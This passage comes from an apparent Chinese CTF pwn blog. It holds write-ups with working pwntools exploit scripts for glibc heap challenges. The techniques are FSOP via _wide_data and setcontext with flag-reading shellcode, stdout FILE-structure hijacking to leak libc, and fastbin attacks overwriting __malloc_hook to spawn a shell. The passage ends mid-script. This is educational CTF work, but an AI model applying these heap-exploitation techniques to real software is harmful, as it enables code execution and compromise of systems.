operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token operator">not</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"0x7f"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token keyword">continue</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token keyword">except</span><span class="token punctuation">:</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token keyword">continue</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> delete<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> delete<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> edit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">62</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> delete<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="tototo"><a href="#tototo" class="headerlink" title="tototo"></a>tototo</h2><p>glibc2.31堆题,开了沙箱,程序逻辑感觉有点莫名奇妙的<br>菜单有malloc、edit、show、delete、calloc.<br>malloc范围在0x200-0x800<br>delete只清空了flag位,但是这个位只在delete的时候检查,基本没用<br>edit存在uaf,但是是read(0,chunk_ptr+9,size-0x30),大概就是防止uaf直接改fd吧,edit有3次机会,超出使用调用edit函数.<br>然后有个free_hook的检查,不为0就exit.<br>直接cat就打了…</p><pre class=" language-python"><code class="language-python">malloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x420</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x210</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x410</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x210</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>main_arena <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">96</span>leak_libc<span class="token punctuation">(</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">,</span>main_arena<span class="token number">-0x10</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>heap_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0xd10</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"heap_base is ->"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x500</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>p64<span class="token punctuation">(</span>main_arena<span class="token operator">+</span><span class="token number">1104</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>io_list_all<span class="token number">-0x20</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x500</span><span class="token punctuation">)</span>fake_io_addr <span class="token operator">=</span> heap_base<span class="token operator">+</span><span class="token number">0x8e0</span>cat <span class="token operator">=</span> b<span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">7</span>cat<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span>cat <span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># rcx!=0(FSOP)</span>cat <span class="token operator">+=</span>p64<span class="token punctuation">(</span>fake_io_addr<span class="token operator">+</span><span class="token number">0xb0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#_IO_backup_base=rdx</span>cat <span class="token operator">+=</span>p64<span class="token punctuation">(</span>setcontext_addr<span class="token operator">+</span><span class="token number">61</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#_IO_save_end=call addr(call setcontext/system)</span>cat <span class="token operator">=</span> cat<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x4f</span><span class="token punctuation">,</span> b<span class="token string">'\x00'</span><span class="token punctuation">)</span>cat <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span><span class="token comment" spellcheck="true"># _chain</span>cat <span class="token operator">=</span> cat<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x6f</span><span class="token punctuation">,</span> b<span class="token string">'\x00'</span><span class="token punctuation">)</span>cat <span class="token operator">+=</span> p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x1000</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span><span class="token comment" spellcheck="true"># _lock = a writable address</span>cat <span class="token operator">=</span> cat<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x87</span><span class="token punctuation">,</span> b<span class="token string">'\x00'</span><span class="token punctuation">)</span>cat <span class="token operator">+=</span>p64<span class="token punctuation">(</span>fake_io_addr<span class="token operator">+</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#_wide_data,rax1_addr</span>cat <span class="token operator">=</span> cat<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xa7</span><span class="token punctuation">,</span> b<span class="token string">'\x00'</span><span class="token punctuation">)</span>cat <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#mode=1</span>cat <span class="token operator">=</span> cat<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xbf</span><span class="token punctuation">,</span> b<span class="token string">'\x00'</span><span class="token punctuation">)</span>cat <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_wfile_jumps'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span><span class="token comment" spellcheck="true"># vtable=IO_wfile_jumps+0x10</span>cat <span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span>cat <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fake_io_addr<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span><span class="token comment" spellcheck="true"># rax2_addr</span>frame <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>heap_base<span class="token punctuation">,</span><span class="token number">0x2000</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">,</span>fake_io_addr<span class="token operator">+</span><span class="token number">0x160</span><span class="token punctuation">,</span>mprotect_addr<span class="token punctuation">]</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''&amp;nbsp; &amp;nbsp; push 0x67616c66&amp;nbsp; &amp;nbsp; mov rdi,rsp&amp;nbsp; &amp;nbsp; xor esi,esi&amp;nbsp; &amp;nbsp; push 2&amp;nbsp; &amp;nbsp; pop rax&amp;nbsp; &amp;nbsp; syscall&amp;nbsp; &amp;nbsp; mov rdi,rax&amp;nbsp; &amp;nbsp; mov rsi,rsp&amp;nbsp; &amp;nbsp; mov edx,0x100&amp;nbsp; &amp;nbsp; xor eax,eax&amp;nbsp; &amp;nbsp; syscall&amp;nbsp; &amp;nbsp; mov edi,1&amp;nbsp; &amp;nbsp; push 1&amp;nbsp; &amp;nbsp; pop rax&amp;nbsp; &amp;nbsp; syscall'''</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>cat<span class="token operator">+</span>frame<span class="token operator">+</span>p64<span class="token punctuation">(</span>fake_io_addr<span class="token operator">+</span><span class="token number">0x168</span><span class="token punctuation">)</span><span class="token operator">+</span>shellcode<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'is:'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="kheap"><a href="#kheap" class="headerlink" title="kheap"></a>kheap</h2><p>好像是kernel的题,以后回来复现了…</p>]]></content>
      
      
      <categories>
          
          <category> ctf复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO任意地址读写</title>
      <link href="/2023/03/03/IO-Arbitrary-Memory-ReadWrite/"/>
      <url>/2023/03/03/IO-Arbitrary-Memory-ReadWrite/</url>
      
        <content type="html"><![CDATA[<h2 id="stdout任意地址读"><a href="#stdout任意地址读" class="headerlink" title="stdout任意地址读"></a>stdout任意地址读</h2><ol><li>通过篡改_IO_2_1_stdout_结构体中的flags字段和_IO_write_base字段，通过篡改flags字段来绕过一些检查，一般覆盖_IO_write_base的最低字节为\x00,改flag为0xfbad1800(0xfbad1887).通过篡改_IO_write_base字段使得系统调用write打印_IO_write_base字段与_IO_write_ptr字段之间的内容泄露出libc地址.</li><li>修改_IO_2_1_stdout_的_IO_write_base和_IO_read_end使其相等,在puts函数时泄露libc地址.<span id="more"></span>相关源码如下:</li></ol><pre class=" language-c"><code class="language-c">_IO_size_t<span class="token function">new_do_write</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span> _IO_size_t to_do<span class="token punctuation">)</span><span class="token punctuation">{</span>  _IO_size_t count<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_IS_APPENDING<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">/* On a system without a proper O_APPEND implementation,       you would need to sys_seek(0, SEEK_END) here, but is       not needed nor desirable for Unix- or Posix-like systems.       Instead, just indicate that offset (before and after) is       unpredictable. */</span>    fp<span class="token operator">-></span>_offset <span class="token operator">=</span> _IO_pos_BAD<span class="token punctuation">;</span>  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_read_end <span class="token operator">!=</span> fp<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span>    <span class="token punctuation">{</span>      _IO_off64_t new_pos    <span class="token operator">=</span> <span class="token function">_IO_SYSSEEK</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> fp<span class="token operator">-></span>_IO_write_base <span class="token operator">-</span> fp<span class="token operator">-></span>_IO_read_end<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>new_pos <span class="token operator">==</span> _IO_pos_BAD<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>      fp<span class="token operator">-></span>_offset <span class="token operator">=</span> new_pos<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  count <span class="token operator">=</span> <span class="token function">_IO_SYSWRITE</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> data<span class="token punctuation">,</span> to_do<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_cur_column <span class="token operator">&amp;&amp;</span> count<span class="token punctuation">)</span>    fp<span class="token operator">-></span>_cur_column <span class="token operator">=</span> <span class="token function">_IO_adjust_column</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_cur_column <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> data<span class="token punctuation">,</span> count<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token function">_IO_setg</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">,</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">,</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">;</span>  fp<span class="token operator">-></span>_IO_write_base <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_write_ptr <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">;</span>  fp<span class="token operator">-></span>_IO_write_end <span class="token operator">=</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_mode <span class="token operator">&lt;=</span> <span class="token number">0</span>               <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> <span class="token punctuation">(</span>_IO_LINE_BUF <span class="token operator">|</span> _IO_UNBUFFERED<span class="token punctuation">)</span><span class="token punctuation">)</span>               <span class="token operator">?</span> fp<span class="token operator">-></span>_IO_buf_base <span class="token punctuation">:</span> fp<span class="token operator">-></span>_IO_buf_end<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> count<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>不知道libc_base的情况下,利用unsortedbin遗留的指针部分覆写劫持stdout.</p><h3 id="例题-de1ctf-2019-weapon"><a href="#例题-de1ctf-2019-weapon" class="headerlink" title="例题 de1ctf_2019_weapon"></a>例题 de1ctf_2019_weapon</h3><p>glibc2.23,保护全开,限制堆块小于0x60,存在uaf,不存在show功能.</p><p>先fastbin attack篡改一个chunk的size使得能被放进unsortedbin<br>再放回fastbin.<br>    最开始想的方案是再篡改unsortedbin chunk的size为0x71然后delete,但是free操作会清空fd,gg<br>    所以采用free另一个0x71的chunk改fd为unsortedbin chunk.<br>然后篡改stdout泄露libc</p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span>fake_chunk<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#unsortedbin</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0x21</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'geban'</span><span class="token punctuation">)</span>  delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>b<span class="token string">'\x20'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x91</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#放进unsortedbin</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x71</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>fake_size_addr <span class="token operator">=</span> <span class="token number">0x7ffff7dd25e5</span>fake_chunk_addr <span class="token operator">=</span> <span class="token number">0x7ffff7dd25dd</span> <span class="token comment" spellcheck="true">#stdout-0x43</span>add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span>b<span class="token string">'\xdd\x25'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>b<span class="token string">'\x40'</span><span class="token punctuation">)</span>  add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>fake_stdout <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token number">0xfbad1800</span><span class="token punctuation">,</span>    <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>    b<span class="token string">'\x00'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> b<span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x33</span><span class="token operator">+</span>fake_stdoutadd<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3c4600</span>leak_libc<span class="token punctuation">(</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">,</span>libc_base<span class="token operator">+</span><span class="token number">0x3c4600</span><span class="token operator">+</span><span class="token number">0xa3</span><span class="token operator">-</span><span class="token number">131</span><span class="token punctuation">)</span>malloc_hook_chunk <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0x23</span>delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>malloc_hook_chunk<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span>b<span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>b<span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">11</span><span class="token punctuation">,</span>libc_base<span class="token operator">+</span>og<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>realloc_addr<span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  add<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>b<span class="token string">'choice >> '</span><span class="token punctuation">,</span>b<span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>b<span class="token string">'wlecome input your size of weapon: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>b<span class="token string">'input index:'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="例题-nsctf-online-2019-pwn1"><a href="#例题-nsctf-online-2019-pwn1" class="headerlink" title="例题 nsctf_online_2019_pwn1"></a>例题 nsctf_online_2019_pwn1</h3><p>glibc2.23,保护全开,不限制堆块大小,不存在uaf.编辑存在offbyone.不存在show</p><p>offbyone制造堆块重叠,利用unsortedbin残留指针fastbin attack劫持_IO_2_1_stdout.<br>问题在于,add取出的时候会memset清空堆块,有字节错位的堆块在_IO_2_1_stdout-0x43的位置,用户域在-0x33的位置,取0x60的堆块将会破坏_IO_write_ptr以致卡死在input前的puts函数,所以这里应取0x59的堆块</p><p>(大致思路如此,由于在制造堆块重叠打fastbin attack时我的做法已经覆写过一次,所以打通概率只有1/256)</p><pre class=" language-python"><code class="language-python">og <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45206</span><span class="token punctuation">,</span><span class="token number">0x4525a</span><span class="token punctuation">,</span><span class="token number">0xef9f4</span><span class="token punctuation">,</span><span class="token number">0xf0897</span><span class="token punctuation">]</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#1</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'d'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#2</span>add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#3</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">'e'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#4</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'geban'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#5</span>  delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token number">0x190</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x280</span><span class="token punctuation">,</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>b<span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x91</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x80</span><span class="token 